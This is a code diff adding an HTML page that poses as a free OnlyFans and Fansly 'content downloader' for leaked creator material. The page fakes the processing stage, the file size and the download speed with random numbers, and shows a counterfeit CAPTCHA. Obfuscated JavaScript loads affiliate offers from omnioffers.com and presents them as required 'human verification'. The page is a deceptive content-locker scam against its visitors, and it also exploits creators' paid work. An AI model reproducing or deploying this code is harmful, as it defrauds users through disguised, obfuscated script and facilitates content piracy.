@@ -1,0 +1,475 @@
+
+<html>
+  <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
+    <link rel="shortcut icon" type="image/png" width="100px" href="favicon.png"/>
+    <meta name="Viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
+    <title>Onlyfans & Fansly Content Downloader</title>
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet"/>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet"/>
+    <link href="css/style.css" rel="stylesheet"/>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-250931574-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-250931574-1');
+</script>
+<!-- <script>$('input').on('change', function() {
+  $('body').toggleClass('blue');
+});
+</script> -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+<style>
+/* Slider */
+
+
+.captcha-checker .captcha {
+  height: 75px;
+  background-color: #f9f9f9;
+  border: 1px solid #d3d3d3;
+  color: #000;
+  padding: 0 10px 0 0;
+  -moz-border-radius: 3px;
+  -webkit-border-radius: 3px;
+  border-radius: 3px;
+  -moz-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .08);
+  -webkit-box-shadow: 0 0 4px 1px rgb(0 0 0 / 8%);
+  box-shadow: 0 0 4px 1px rgb(0 0 0 / 8%);
+  position: relative;
+  box-sizing: border-box;
+  width: 300px;
+  max-width: 100%;
+}
+
+.captcha-checker .captcha {
+  display: flex;
+  align-items: center;
+  font-family: Roboto, sans-serif !important;
+}
+
+.captcha-checker .logo {
+  margin-left: auto; display: flex; flex-direction: column; align-items: center; gap: 6px; color: #9e9e9e;
+  max-width: 59px;
+  width: 170px;
+}
+
+.captcha-checker .logo p {
+  margin: 0px;
+}
+
+.captcha-checker .captcha-privacy {
+  text-align: center;
+  display: flex;
+  flex-direction: column;
+}
+
+.captcha-checker .captcha-privacy p {
+  font-size: 10px;
+}
+
+.captcha-checker .captcha-privacy small {
+  font-size: 8px;
+}
+
+.captcha-checker .spinner {
+  position: relative;
+  width: 2em;
+  height: 2em;
+  display: flex;
+  margin: 2em 1em;
+  align-items: center;
+  justify-content: center;
+}
+
+.captcha-checker input[type="checkbox"] {
+  position: absolute;
+  opacity: 0;
+  z-index: -1;
+}
+
+.captcha-checker input[type="checkbox"]+.checkmark {
+  display: inline-block;
+  width: 30px;
+  height: 30px;
+  background-color: #fcfcfc;
+  border: 2.5px solid #c3c3c3;
+  border-radius: 3px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  cursor: pointer;
+}
+
+.captcha-checker input[type="checkbox"]+.checkmark span {
+  content: '';
+  position: relative;
+  margin-top: -3px;
+  transform: rotate(45deg);
+  width: .75em;
+  height: 1.2em;
+  opacity: 0;
+}
+
+.captcha-checker.active input[type="checkbox"]+.checkmark {
+  animation: 2s spin linear infinite;
+}
+
+.captcha-checker input[type="checkbox"]:checked+.checkmark {
+  animation: 2s spin linear infinite;
+}
+
+@keyframes spin {
+  10% {
+    width: 0;
+    height: 0;
+    border-width: 6px;
+  }
+
+  30% {
+    width: 0;
+    height: 0;
+    border-radius: 50%;
+    border-width: 1em;
+    transform: rotate(0deg);
+    border-color: rgb(199, 218, 245);
+  }
+
+  50% {
+    width: 2em;
+    height: 2em;
+    border-radius: 50%;
+    border-width: 4px;
+    border-color: rgb(199, 218, 245);
+    border-right-color: rgb(89, 152, 239);
+  }
+
+  70% {
+    border-width: 4px;
+    border-color: rgb(199, 218, 245);
+    border-right-color: rgb(89, 152, 239);
+  }
+
+  90% {
+    border-width: 4px;
+  }
+
+  100% {
+    width: 2em;
+    height: 2em;
+    border-radius: 50%;
+    transform: rotate(720deg);
+    border-color: transparent;
+  }
+}
+
+.captcha-checker .verify-panel {
+  /* background: rgb(49, 49, 49); */
+  position: absolute;
+  float: left;
+  left: 50%;
+  top: 30%;
+  transform: translate(-50%, -50%);
+  background: #fff;
+  border: 1px solid #ccc;
+  font-family: sans-serif;
+  z-index: 999999999999;
+  margin: 0 6px;
+  width: 96%;
+  max-width: 512px
+}
+
+.captcha-checker .verify-panel .head {
+  margin: 10px;
+  padding: 10px;
+  background: #498ef9;
+  color: #fff;
+}
+
+.captcha-checker .verify-panel .text-content {
+  line-height: 1;
+}
+
+.captcha-checker .verify-panel .content {
+  margin: 10px;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.captcha-checker .verify-panel .footer {
+  margin-top: auto;
+  border-top: 1px solid #ccc;
+  padding: 11px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.captcha-checker .app-item {
+  display: flex;
+  border: 1px solid #d3d3d3;
+}
+
+.captcha-checker .app-item:hover {
+  background: #498ef8;
+  color: #fff;
+}
+
+.captcha-checker .app-info .title {
+  font-size: 15px;
+}
+
+.captcha-checker *,
+.captcha-checker ::after,
+.captcha-checker ::before {
+  box-sizing: border-box;
+}
+
+.captcha-checker .app-item>img {
+  width: 55px;
+  height: 55px;
+  padding: 6px;
+}
+
+.captcha-checker .app-item .app-info {
+  display: flex;
+  flex-direction: column;
+  padding: 3px;
+}
+
+.captcha-checker .app-info img {
+  width: 60px;
+}
+
+.captcha-checker .app-info .description {
+  font-size: 12px;
+  color: #acacac;
+}
+
+.captcha-checker .verify-panel .footer .icons img {
+  width: 60px;
+}
+
+.captcha-checker .footer button {
+  background: #498ef8;
+  color: #fff;
+  font-weight: bold;
+  text-transform: uppercase;
+  border: 0px;
+  padding: 9px 17px;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+.captcha-checker .apps-content a {
+  text-decoration: none;
+  color: #000;
+}
+
+.captcha-checker .apps-content {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+  height: 100%;
+  max-height: 214px;
+  overflow: hidden;
+  overflow-y: auto !important;
+}
+
+.captcha-checker .hidden {
+  display: none;
+}
+
+.captcha-checker .captcha-content {
+  display: flex;
+  flex-direction: row;
+  justify-content: center;
+  text-align: left;
+  position: relative;
+}
+
+@media only screen and (max-width: 530px) {
+  .captcha-checker .verify-panel {
+    /* background: green; */
+    position: absolute;
+    float: left;
+    left: 50%;
+    top: 35%;
+    transform: translate(-50%, -50%);
+    
+  }
+
+  .captcha-checker.active .overly-screen {
+    display: block;
+  }
+}
+</style>
+
+  </head>
+  <body style="overflow-y:scroll;">
+    <nav><div class="leaks">
+      <img class="logo" src="img/leaksonelogo.png"/>
+      <img class="desktop" src="img/logodesktop.png"/></div></nav>
+    <main>  
+      <section class="badge-generator">
+        <div class="section-head">
+          <div class="section-head-title"><img src="img/badge.png"/>
+            <h3>Free Content Downloader</h3>
+          </div>
+          <br>
+          <div class="section-head-description">
+            <!-- <h4>Download/View MEGA & Gofile of any Onlyfans Profile</h4><br> -->
+            <p> Do not share or rehost the content that we host, Our crawlers constantly scan if the contents from <b><u>Leaks-One</u></b> have been re-shared. If found your IP will be permanently blocked from using our services.</p>
+          
+          </div>
+        </div>
+        
+        <div class="section-body" style="color:white">
+          <p>Enter the username without the '@' below</p>
+          <input type="text" placeholder="Enter Username" onfocus="this.placeholder=''" onblur="this.placeholder='Enter Username'"/>
+          <button><b>Download Content</b></button>
+   
+
+      
+          <script type="text/javascript">
+            function _0x2fc3(){var _0x13d575=['8jVvcjI','8475264FBxZzv','gripverify.com','</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22description\x22>','\x22\x20width=\x22120\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22app-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<span\x20class=\x22title\x22>','omnioffers.com','\x27\x20target=\x22_blank\x22\x20rel=\x22noreferrer\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22app-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<img\x20src=\x22','replace','875898ujEekV','9141795DDgulX','4972751UzPXZa','44089821HJiwqn','offerphoto','append','.apps-content','3blydrc','getJSON','\x20to\x20download\x20your\x20files</span>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','each','offerlink','3611864IRuoea','1502448qTkpQL','title','description'];_0x2fc3=function(){return _0x13d575;};return _0x2fc3();}function _0x33e4(_0x3332f4,_0x3f46a4){var _0x2fc310=_0x2fc3();return _0x33e4=function(_0x33e42d,_0x1143f7){_0x33e42d=_0x33e42d-0x1be;var _0x3395a6=_0x2fc310[_0x33e42d];return _0x3395a6;},_0x33e4(_0x3332f4,_0x3f46a4);}var _0x261705=_0x33e4;(function(_0x45039d,_0xa98b99){var _0xd0a1ee=_0x33e4,_0x1e1edf=_0x45039d();while(!![]){try{var _0x119be8=-parseInt(_0xd0a1ee(0x1d1))/0x1+-parseInt(_0xd0a1ee(0x1c4))/0x2*(parseInt(_0xd0a1ee(0x1cb))/0x3)+-parseInt(_0xd0a1ee(0x1d0))/0x4+-parseInt(_0xd0a1ee(0x1c5))/0x5+parseInt(_0xd0a1ee(0x1d5))/0x6+parseInt(_0xd0a1ee(0x1c6))/0x7*(-parseInt(_0xd0a1ee(0x1d4))/0x8)+parseInt(_0xd0a1ee(0x1c7))/0x9;if(_0x119be8===_0xa98b99)break;else _0x1e1edf['push'](_0x1e1edf['shift']());}catch(_0x1a9fa2){_0x1e1edf['push'](_0x1e1edf['shift']());}}}(_0x2fc3,0xe2e12),$[_0x261705(0x1cc)]('https://omnioffers.com/common/offer_feed_json.php?user_id=361244&pubkey=0f46b32873b85dc92e2c8bfc2b48d0da&tracking_id=&ip=',function(_0x5edda7){var _0x4fb50f=_0x261705;$[_0x4fb50f(0x1ce)](_0x5edda7['offers'],function(_0x107421,_0x1fe8ff){var _0x2e0c86=_0x4fb50f,_0x324f1d='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x27'+_0x1fe8ff[_0x2e0c86(0x1cf)]+_0x2e0c86(0x1c2)+_0x1fe8ff[_0x2e0c86(0x1c8)]+_0x2e0c86(0x1c0)+_0x1fe8ff[_0x2e0c86(0x1d2)]+_0x2e0c86(0x1bf)+_0x1fe8ff[_0x2e0c86(0x1d3)]+_0x2e0c86(0x1cd);_0x1fe8ff[_0x2e0c86(0x1cf)]=_0x1fe8ff[_0x2e0c86(0x1cf)][_0x2e0c86(0x1c3)](_0x2e0c86(0x1be),_0x2e0c86(0x1c1)),$(_0x2e0c86(0x1ca))[_0x2e0c86(0x1c9)](_0x324f1d);});}));
+                
+              </script>          
+      </section>
+      <section class="generating-badge">
+        <div class="section-head">
+          <div class="section-head-title">
+            <h3>Processing!</h3>
+          </div>
+          <br>
+          <div class="section-head-description">
+            <p>Please wait while we process your content's request</p>
+            <br>
+            <p>Download Speed: <span id="speed"></span></p>
+          </div>
+        </div>
+        <div class="section-body">
+          <div id="progress-wrapper"></div>
+          <p class="progress-message">Connecting to site......</p>
+        </div>
+      </section>
+      <section class="human-verification">
+        <div class="section-head" style="background-color:white">
+          <div class="section-head-title">
+            <h3>Content Found</h3><br>
+          </div>
+          <div class="section-head-description">
+            <p>Estimated size: <span id="file_size"></span></p>
+          </div>
+        </div>
+        
+        <div class="section-body">
+          <h4>One Time Prompt</h4>
+          <br><p>Please complete a quick human verification task.</p>
+          <p class="verification-text">Please check the captcha then click <span class="text-standout">Continue </span> to view/download your files.</p>
+          <br>
+          <div class="mybox">
+            <div data-captcha-box="true" align="center">
+              <div class="captcha-checker">
+                <div class="captcha">
+                  <div class="spinner">
+                    <label>
+                      <input type="checkbox" onclick="setTimeout(function() { document.querySelector('.verify-panel').classList.remove('hidden'); document.querySelector('.overly-screen').style.display='block'; document.body.style.overflow='hidden'; document.querySelector('.recent-activity').style.opacity='0'}, 1000)">
+                      <span class="checkmark">
+                        <span>&nbsp;</span>
+                      </span>
+                    </label>
+                  </div>
+                  <div class="text"> I'm not a robot </div>
+                  <div class="logo">
+                    <img src="data:image/png;base64,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" width="28px" height="28px">
+                    <div class="captcha-privacy">
+                      <p>CAPTCHA</p>
+                      <small>Privacy - Terms</small>
+                    </div>
+                  </div>
+                </div>
+                <div class="captcha-content">
+                  <div class="overly-screen" style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; background-color: rgba(0, 0, 0, 0.8); z-index: 100000; display: none; ">
+                  <div class="verify-panel">
+                    <div class="head">
+                      <span>
+                        <b>Are you a BOT?</b>
+                      </span>
+                    </div>
+                    <div class="content">
+                      <div class="text-content">
+                        <center>
+                          <b>You will be able to download/view your files once you: <br>
+                            <br>Verify you are a human from any below</b>
+                        </center>
+                      </div>
+                      <div class="apps-content"></div>
+                
+                    </div>
+                    
+                    <div class="footer">
+                      <div class="icons">
+                        <img src="img/side-image.png">
+                      </div>
+                      <button>Verify</button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+           
+          </div>
+        </div>
+          <a id="verify-button"> <button onclick="alert('Please check the captcha before continuing.')"><b>Continue</b></button></a>
+          <!-- <script type="text/javascript" src="https://verifysuper.com/cp/js/dwmpr"></script> -->
+
+ 
+          <div class="awaiting-verification"><img src="img/spinner.svg"/><span>Awaiting Verification</span></div>
+        </div>
+        
+      </section>
+    </main>
+    <section class="recent-activity">
+      <div class="section-head">
+        <div class="section-head-title">
+          <h3>Recent Downloads</h3>
+          <div class="live-dot"></div>
+        </div>
+        <br>
+        <div class="section-head-description">
+          <p>Recent activities will update every 5 seconds.</p>
+        </div>
+      </div>
+      <div class="section-body">
+        <div class="activities" ></div>
+      </div>
+    </section>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/progressbar.js/1.0.1/progressbar.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mobile-detect/1.4.3/mobile-detect.min.js"></script>
+    <script src="main.js"></script>
+    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.2.1/axios.min.js"></script> -->
+    <script>
+        file_size=Math.floor(Math.random() * 1500)
+        if(file_size>1024)
+          file_size=parseInt(file_size/1024).toString()+" "+"GB"
+        else
+          file_size=file_size.toString()+" "+"MB"
+        document.querySelector("#file_size").textContent=file_size
+    </script>
+    <script>
+      speed=Math.floor(Math.random() * (105 - 100) + 100);
+      
+      
+        speed=speed.toString()+" "+"MB/s"
+      document.querySelector("#speed").textContent=speed
+  </script>
+
+
+     
+  </body>
+</html>
